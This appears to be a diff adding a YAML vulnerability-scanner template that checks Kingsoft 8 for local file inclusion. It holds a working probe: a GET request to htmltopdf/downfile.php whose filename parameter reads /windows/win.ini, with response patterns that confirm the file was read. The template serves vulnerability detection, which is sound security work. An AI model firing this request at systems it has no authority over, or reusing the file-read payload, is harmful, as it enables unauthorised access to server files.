@@ -1,0 +1,30 @@
+id: kingsoft-v8-file-read
+brief:
+    title: Kingsoft 8 - Local File Inclusion
+    by: ritikchaddha
+    level: high
+    about: Kingsoft 8 is vulnerable to local file inclusion.
+    label:
+        - kingsoft
+        - lfi
+        - vuln
+    score: CVSS:7.5
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/htmltopdf/downfile.php?filename=/windows/win.ini'
+      signs:
+        - "on": word
+          has:
+            - for 16-bit app support
+            - '[extensions]'
+          in: body
+          need: all
+        - "on": word
+          has:
+            - application/zip
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
